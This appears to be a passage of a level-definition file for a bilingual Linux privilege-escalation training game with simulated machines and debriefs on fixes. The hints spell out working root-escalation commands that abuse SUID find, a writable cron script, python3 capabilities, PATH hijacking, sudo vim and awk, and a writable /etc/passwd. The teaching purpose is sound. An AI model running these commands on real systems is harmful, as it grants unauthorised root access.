// 5 privesc machines — each independent, one distinct vulnerability

// ── Shared fs-node stubs ─────────────────────────────────────────────────
// The overwhelming majority of `/usr/bin/*` entries across levels are just
// "plain 755 ELF binary owned by root" (or the SUID variant for sudo/su/etc.)
// — factored out so a level's fs only has to name the binary and its
// exception, not repeat owner/mode/content every time. Pass overrides for
// anything level-specific (capabilities, a custom content string...).
const ELF_BIN = (overrides = {}) => ({ type: 'file', owner: 'root', mode: '755', content: 'ELF binary', ...overrides });
const SUID_BIN = (overrides = {}) => ({ type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary', ...overrides });

window.LEVELS = [
    // ─────────────────────────────────────────────────────────────
    // LEVEL 1 — SUID misconfiguration on /usr/bin/find
    // ─────────────────────────────────────────────────────────────
    {
        id: 1,
        codename: 'box-01',
        title: { en: 'Box-01 · SUID Bit Bandit', fr: 'Box-01 · Le voleur de bit SUID' },
        brief: {
            en: "You landed a shell as low-priv user 'player'. Some binary owned by root has SUID set and shouldn't. Find it, abuse it.",
            fr: "Tu as un shell en tant que 'player'. Un binaire root possède un SUID qui ne devrait pas être là. Trouve-le et exploite-le."
        },
        user: 'player',
        host: 'box-01',
        cwd: '/home/player',
        objectives: {
            en: ['Enumerate SUID binaries', 'Identify the vulnerable one', 'Get a root shell'],
            fr: ['Énumérer les binaires SUID', 'Identifier le binaire vulnérable', 'Obtenir un shell root']
        },
        hints: {
            en: [
                'SUID binaries have the "s" bit. Try: find / -perm -4000 2>/dev/null',
                '/usr/bin/find with SUID root is dangerous. Check GTFOBins for "find".',
                'find can execute commands. Try: find . -exec /bin/sh -p \\;'
            ],
            fr: [
                'Les binaires SUID ont le bit "s". Essaie : find / -perm -4000 2>/dev/null',
                '/usr/bin/find avec SUID root est dangereux. Regarde GTFOBins pour "find".',
                'find peut exécuter des commandes. Essaie : find . -exec /bin/sh -p \\;'
            ]
        },
        flag: 'flag{suid_find_pwn3d}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc — nothing interesting here\n' },
            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'TODO:\n- audit SUID bins on this box\n- report to secteam\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'shadow'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/shadow': { type: 'file', owner: 'root', mode: '600', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{suid_find_pwn3d}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['find', 'ls', 'cat', 'sh', 'bash'] },
            '/usr/bin/find': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        // Declared win condition — checked at runtime by CMD.winConditionMet()
        // before any spawnShell(true, {type}) call is allowed to grant root.
        wins: [
            { type: 'suid_shell_via', binary: '/usr/bin/find' }
        ],
        harden: {
            type: 'unset_suid', target: '/usr/bin/find',
            obj: { en: 'Remove the SUID bit from /usr/bin/find', fr: 'Retire le bit SUID de /usr/bin/find' },
            hint: { en: 'chmod u-s /usr/bin/find', fr: 'chmod u-s /usr/bin/find' }
        },
        debrief: {
            en: {
                vuln: 'SUID misconfiguration (find)',
                why: '/usr/bin/find had the SUID bit set as root. GTFOBins lists find among binaries that can spawn a shell via -exec, so any user running it inherits root privileges instead of just listing files.',
                fix: 'Remove the SUID bit unless strictly required (chmod u-s /usr/bin/find), and audit SUID binaries regularly with find / -perm -4000. Never grant SUID to general-purpose tools that can execute arbitrary commands.',
                link: 'https://gtfobins.github.io/gtfobins/find/'
            },
            fr: {
                vuln: 'Mauvaise config SUID (find)',
                why: '/usr/bin/find avait le bit SUID posé en root. GTFOBins liste find parmi les binaires capables d\'ouvrir un shell via -exec : n\'importe quel utilisateur qui l\'exécute hérite des droits root au lieu de simplement lister des fichiers.',
                fix: 'Retire le bit SUID sauf nécessité stricte (chmod u-s /usr/bin/find), et audite régulièrement les binaires SUID avec find / -perm -4000. Ne jamais donner le SUID à un outil généraliste capable d\'exécuter des commandes arbitraires.',
                link: 'https://gtfobins.github.io/gtfobins/find/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 2 — Writable cron script running as root
    // ─────────────────────────────────────────────────────────────
    {
        id: 2,
        codename: 'box-02',
        title: { en: 'Box-02 · The Cron Whisperer', fr: 'Box-02 · Le chuchoteur de cron' },
        brief: {
            en: 'A scheduled job runs every minute as root. Somewhere a script it executes is world-writable. Hijack the payload.',
            fr: 'Un job planifié tourne toutes les minutes en root. Un script qu\'il exécute est accessible en écriture pour tous. Détourne le payload.'
        },
        user: 'player',
        host: 'box-02',
        cwd: '/home/player',
        objectives: {
            en: ['Read /etc/crontab', 'Find a writable script called by root', 'Overwrite it and wait for cron'],
            fr: ['Lire /etc/crontab', 'Trouver un script accessible en écriture appelé par root', 'Réécrire ce script et attendre cron']
        },
        hints: {
            en: [
                'cat /etc/crontab shows system-wide jobs.',
                '/opt/backup.sh runs as root every minute. Check its permissions: ls -la /opt/backup.sh',
                'Overwrite the script: echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh — then type "wait".'
            ],
            fr: [
                'cat /etc/crontab affiche les jobs système.',
                '/opt/backup.sh tourne en root chaque minute. Vérifie ses permissions : ls -la /opt/backup.sh',
                'Réécris le script : echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh — puis tape "wait".'
            ]
        },
        flag: 'flag{cr0n_writable_l00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'crontab'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/crontab': { type: 'file', owner: 'root', mode: '644', content:
`# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# m h dom mon dow user  command
*  *  *   *   *  root  /opt/backup.sh
17 *  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
` },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{cr0n_writable_l00t}\n' },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['backup.sh'] },
            '/opt/backup.sh': { type: 'file', owner: 'root', mode: '777', writable_by_all: true, content:
`#!/bin/sh
# Nightly backup helper
echo "backup at $(date)" >> /var/log/backup.log
` },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['log'] },
            '/var/log': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'cron_hijack', path: '/opt/backup.sh' }
        ],
        harden: {
            type: 'lock_perms', target: '/opt/backup.sh',
            obj: { en: 'Make /opt/backup.sh no longer world-writable', fr: 'Rends /opt/backup.sh non modifiable par tous' },
            hint: { en: 'chmod 700 /opt/backup.sh', fr: 'chmod 700 /opt/backup.sh' }
        },
        debrief: {
            en: {
                vuln: 'World-writable cron script',
                why: "root's crontab runs /opt/backup.sh every minute, but the script itself is writable by any user (mode 777). Overwriting it lets an attacker execute arbitrary code with root's privileges the next time cron fires.",
                fix: 'Scripts run by root must never be group- or world-writable. Set correct ownership and permissions (chmod 700, chown root:root) on any file referenced by a privileged cron job, and regularly audit /etc/crontab and cron.d entries for what they call.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            },
            fr: {
                vuln: 'Script cron accessible en écriture pour tous',
                why: "Le crontab root exécute /opt/backup.sh chaque minute, mais le script lui-même est accessible en écriture par n'importe quel utilisateur (mode 777). L'écraser permet d'exécuter du code arbitraire avec les droits root au prochain déclenchement de cron.",
                fix: "Un script exécuté par root ne doit jamais être accessible en écriture au groupe ou à tous. Fixe les bons propriétaire/permissions (chmod 700, chown root:root) sur tout fichier appelé par un job cron privilégié, et audite régulièrement /etc/crontab et cron.d.",
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 3 — Linux capabilities (cap_setuid on python3)
    // ─────────────────────────────────────────────────────────────
    {
        id: 3,
        codename: 'box-03',
        title: { en: 'Box-03 · Capable of Everything', fr: 'Box-03 · Capable de tout' },
        brief: {
            en: 'Traditional SUID audit shows nothing juicy. But capabilities are another attack surface — inspect them.',
            fr: 'L\'audit SUID classique ne donne rien. Mais les capabilities sont une autre surface d\'attaque — inspecte-les.'
        },
        user: 'player',
        host: 'box-03',
        cwd: '/home/player',
        objectives: {
            en: ['List capabilities on the system', 'Identify the risky binary', 'Abuse it to setuid(0)'],
            fr: ['Lister les capabilities du système', 'Identifier le binaire à risque', 'L\'exploiter pour setuid(0)']
        },
        hints: {
            en: [
                'Try: getcap -r / 2>/dev/null',
                'python3 with cap_setuid+ep lets you change UID to 0.',
                'Payload: python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\''
            ],
            fr: [
                'Essaie : getcap -r / 2>/dev/null',
                'python3 avec cap_setuid+ep te permet de passer UID à 0.',
                'Payload : python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\''
            ]
        },
        flag: 'flag{c4p_setuid_ftw}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'HINT.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/HINT.txt': { type: 'file', owner: 'player', mode: '644', content: 'SUID search returned nothing.\nHave you looked at Linux capabilities?\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{c4p_setuid_ftw}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['python3', 'ls', 'cat', 'sh', 'bash', 'getcap', 'setcap'] },
            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', capabilities: 'cap_setuid+ep', content: 'ELF binary' },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/getcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/setcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'python_setuid' }
        ],
        harden: {
            type: 'unset_cap', target: '/usr/bin/python3',
            obj: { en: 'Strip the cap_setuid capability from python3', fr: 'Retire la capability cap_setuid de python3' },
            hint: { en: 'setcap -r /usr/bin/python3', fr: 'setcap -r /usr/bin/python3' }
        },
        debrief: {
            en: {
                vuln: 'Linux capability cap_setuid+ep on python3',
                why: 'Linux capabilities grant a binary partial root powers without full SUID. python3 was granted cap_setuid, so it can call setuid(0) directly from a script and spawn a root shell — bypassing regular permission checks entirely.',
                fix: 'Remove unnecessary capabilities with setcap -r /usr/bin/python3, and treat cap_setuid/cap_setgid on interpreters (python, perl, ruby, node) as equivalent to full SUID root. Audit with getcap -r / regularly.',
                link: 'https://gtfobins.github.io/gtfobins/python3/'
            },
            fr: {
                vuln: 'Capability Linux cap_setuid+ep sur python3',
                why: 'Les capabilities Linux donnent à un binaire des pouvoirs root partiels sans SUID complet. python3 avait cap_setuid : il peut appeler setuid(0) directement depuis un script et ouvrir un shell root, en contournant totalement les vérifications de permissions classiques.',
                fix: 'Retire les capabilities inutiles avec setcap -r /usr/bin/python3, et traite cap_setuid/cap_setgid sur un interpréteur (python, perl, ruby, node) comme un SUID root complet. Audite régulièrement avec getcap -r /.',
                link: 'https://gtfobins.github.io/gtfobins/python3/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 4 — PATH hijacking against SUID binary
    // ─────────────────────────────────────────────────────────────
    {
        id: 4,
        codename: 'box-04',
        title: { en: 'Box-04 · PATH of Least Resistance', fr: 'Box-04 · Le chemin de moindre résistance' },
        brief: {
            en: 'A SUID helper /usr/local/bin/status calls an external command without an absolute path. Rewrite the PATH.',
            fr: 'Un helper SUID /usr/local/bin/status appelle une commande externe sans chemin absolu. Réécris le PATH.'
        },
        user: 'player',
        host: 'box-04',
        cwd: '/home/player',
        objectives: {
            en: ['Find SUID binaries', 'Analyze what /usr/local/bin/status calls', 'Hijack the PATH to run your own binary'],
            fr: ['Trouver les binaires SUID', 'Analyser ce qu\'appelle /usr/local/bin/status', 'Détourner le PATH avec ton propre binaire']
        },
        hints: {
            en: [
                'Try: find / -perm -4000 2>/dev/null and then strings /usr/local/bin/status',
                '/usr/local/bin/status calls "ps" without absolute path.',
                'Payload:\n  echo \'#!/bin/sh\' > /tmp/ps\n  echo \'/bin/sh\' >> /tmp/ps\n  chmod +x /tmp/ps\n  export PATH=/tmp:$PATH\n  /usr/local/bin/status'
            ],
            fr: [
                'Essaie : find / -perm -4000 2>/dev/null puis strings /usr/local/bin/status',
                '/usr/local/bin/status appelle "ps" sans chemin absolu.',
                'Payload :\n  echo \'#!/bin/sh\' > /tmp/ps\n  echo \'/bin/sh\' >> /tmp/ps\n  chmod +x /tmp/ps\n  export PATH=/tmp:$PATH\n  /usr/local/bin/status'
            ]
        },
        flag: 'flag{path_h1jack3d}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{path_h1jack3d}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'local'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'find', 'strings', 'ps'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/find': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/strings': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/ps': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/local': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/local/bin': { type: 'dir', owner: 'root', mode: '755', children: ['status'] },
            '/usr/local/bin/status': { type: 'file', owner: 'root', mode: '4755', suid: true, content:
`ELF binary (system status helper)
Embedded strings:
  === status v1.2 ===
  System status:
  system(ps -eo user,pid,cmd);
  system("ps");
`, calls_unqualified: 'ps' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'path_hijack', target: '/usr/local/bin/status', hijack_cmd: 'ps' }
        ],
        harden: {
            type: 'unset_suid', target: '/usr/local/bin/status',
            obj: { en: 'Remove the SUID bit from /usr/local/bin/status', fr: 'Retire le bit SUID de /usr/local/bin/status' },
            hint: { en: 'chmod u-s /usr/local/bin/status', fr: 'chmod u-s /usr/local/bin/status' }
        },
        debrief: {
            en: {
                vuln: 'PATH hijack against a SUID helper',
                why: '/usr/local/bin/status is SUID root but calls "ps" without an absolute path. The program trusts the PATH environment variable, so placing a malicious "ps" earlier in PATH makes the SUID binary execute attacker-controlled code as root.',
                fix: 'Never call external commands by relative name from privileged code — always use absolute paths (/bin/ps). Drop or sanitize PATH before executing anything as root, and inspect SUID binaries with strings to spot unqualified command calls.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            },
            fr: {
                vuln: 'Détournement de PATH contre un helper SUID',
                why: '/usr/local/bin/status est SUID root mais appelle "ps" sans chemin absolu. Le programme fait confiance à la variable PATH : placer un faux "ps" plus tôt dans le PATH fait exécuter du code contrôlé par l\'attaquant, avec les droits root.',
                fix: 'Ne jamais appeler une commande externe par son nom relatif depuis du code privilégié — toujours utiliser un chemin absolu (/bin/ps). Nettoie ou fige le PATH avant d\'exécuter quoi que ce soit en root, et inspecte les binaires SUID avec strings pour repérer les appels non qualifiés.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 5 — Sudoers misconfig: NOPASSWD on vim
    // ─────────────────────────────────────────────────────────────
    {
        id: 5,
        codename: 'box-05',
        title: { en: 'Box-05 · Sudo, But Too Much', fr: 'Box-05 · Sudo, un peu trop généreux' },
        brief: {
            en: 'The sysadmin gave you sudo access to a text editor. Editors that shell out are your best friend.',
            fr: "L'admin t'a donné sudo sur un éditeur de texte. Les éditeurs qui lancent un shell sont tes meilleurs amis."
        },
        user: 'player',
        host: 'box-05',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Identify the abusable command', 'Escape to a root shell via the editor'],
            fr: ['Vérifier tes droits sudo', 'Identifier la commande exploitable', 'Sortir en root via l\'éditeur']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'You can run /usr/bin/vim as root with NOPASSWD. Vim can spawn shells.',
                'Payload: sudo vim -c \':!/bin/sh\''
            ],
            fr: [
                'Essaie : sudo -l',
                'Tu peux lancer /usr/bin/vim en root sans mot de passe. Vim peut ouvrir un shell.',
                'Payload : sudo vim -c \':!/bin/sh\''
            ]
        },
        flag: 'flag{sud0_v1m_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0_v1m_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'vim'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/vim': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            // sudo -l output for player
            player: [
                { cmd: '/usr/bin/vim', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_vim_escape' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on vim',
                why: "The sudoers file lets 'player' run /usr/bin/vim as root without a password. Vim can execute shell commands (:! or :!sh), which inherit vim's elevated privileges — an instant root shell.",
                fix: 'Never grant sudo on general-purpose editors, interpreters, or pagers listed on GTFOBins. If an editor must run as root, restrict it (e.g. rvim, sudoedit) or wrap it so shelling out is disabled.',
                link: 'https://gtfobins.github.io/gtfobins/vim/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur vim',
                why: "Le fichier sudoers autorise 'player' à lancer /usr/bin/vim en root sans mot de passe. Vim peut exécuter des commandes shell (:! ou :!sh), qui héritent des privilèges de vim — un shell root immédiat.",
                fix: 'Ne jamais donner de sudo sur un éditeur, interpréteur ou pager généraliste listé sur GTFOBins. Si un éditeur doit tourner en root, restreins-le (ex. rvim, sudoedit) ou bloque la sortie shell.',
                link: 'https://gtfobins.github.io/gtfobins/vim/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 6 — World-writable /etc/passwd
    // ─────────────────────────────────────────────────────────────
    {
        id: 6,
        codename: 'box-06',
        title: { en: 'Box-06 · Passwd the Parcel', fr: 'Box-06 · Le passwd de la discorde' },
        brief: {
            en: '/etc/passwd should never be writable by users. On this box, it is. Add yourself a root.',
            fr: '/etc/passwd ne devrait jamais être modifiable par les utilisateurs. Ici, il l\'est. Ajoute-toi un root.'
        },
        user: 'player',
        host: 'box-06',
        cwd: '/home/player',
        objectives: {
            en: ['Check /etc/passwd permissions', 'Append a UID-0 account with no password', 'Switch to it'],
            fr: ['Vérifier les permissions de /etc/passwd', 'Ajouter un compte UID 0 sans mot de passe', 'Basculer dessus']
        },
        hints: {
            en: [
                'ls -la /etc/passwd — is it writable? A password field left empty means "no password".',
                'A line with an empty second field and UID 0 is a passwordless root: name::0:0::/root:/bin/bash',
                'echo \'r00t::0:0:pwned:/root:/bin/bash\' >> /etc/passwd  then  su r00t'
            ],
            fr: [
                'ls -la /etc/passwd — modifiable ? Un 2e champ vide = "pas de mot de passe".',
                'Une ligne au 2e champ vide et UID 0 est un root sans mot de passe : nom::0:0::/root:/bin/bash',
                'echo \'r00t::0:0:pwned:/root:/bin/bash\' >> /etc/passwd  puis  su r00t'
            ]
        },
        flag: 'flag{writ4ble_passwd_r00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'Migration in progress — perms on /etc were loosened "temporarily".\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'shadow'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '666', writable_by_all: true, content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/shadow': { type: 'file', owner: 'root', mode: '600', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{writ4ble_passwd_r00t}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'su', 'openssl'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/su': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/openssl': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'passwd_write' }
        ],
        harden: {
            type: 'lock_perms', target: '/etc/passwd',
            obj: { en: 'Restore safe permissions on /etc/passwd (644)', fr: 'Restaure des permissions sûres sur /etc/passwd (644)' },
            hint: { en: 'chmod 644 /etc/passwd', fr: 'chmod 644 /etc/passwd' }
        },
        debrief: {
            en: {
                vuln: 'World-writable /etc/passwd',
                why: '/etc/passwd was mode 666, so any user could append their own account. A line with an empty password field and UID 0 is a passwordless root account — su into it and you are root, no cracking required.',
                fix: '/etc/passwd must be 644 and owned by root. Never loosen its permissions. Passwords belong in /etc/shadow (640, root:shadow); an empty password field in passwd is a critical misconfiguration.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd'
            },
            fr: {
                vuln: '/etc/passwd modifiable par tous',
                why: '/etc/passwd était en 666 : n\'importe qui pouvait y ajouter un compte. Une ligne au champ mot de passe vide et UID 0 est un root sans mot de passe — un su suffit pour devenir root, sans rien casser.',
                fix: '/etc/passwd doit être en 644, propriété de root. Ne jamais assouplir ses droits. Les mots de passe vont dans /etc/shadow (640, root:shadow) ; un champ mot de passe vide dans passwd est une faille critique.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 7 — Sudoers misconfig: NOPASSWD on awk (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 7,
        codename: 'box-07',
        title: { en: 'Box-07 · Awk-ward Privileges', fr: 'Box-07 · Des privilèges Awk-ward' },
        brief: {
            en: 'sudo lets you run a text-processing tool as root. Many of them can shell out. Find the one you have.',
            fr: 'sudo t\'autorise un outil de traitement de texte en root. Beaucoup peuvent ouvrir un shell. Trouve le tien.'
        },
        user: 'player',
        host: 'box-07',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Recognise the GTFOBins-listed binary', 'Spawn a root shell from it'],
            fr: ['Vérifier tes droits sudo', 'Reconnaître le binaire listé sur GTFOBins', 'En faire jaillir un shell root']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'awk can run arbitrary commands with its BEGIN block. Check GTFOBins for "awk".',
                'Payload: sudo awk \'BEGIN{system("/bin/sh")}\''
            ],
            fr: [
                'Essaie : sudo -l',
                'awk peut exécuter des commandes via son bloc BEGIN. Regarde GTFOBins pour "awk".',
                'Payload : sudo awk \'BEGIN{system("/bin/sh")}\''
            ]
        },
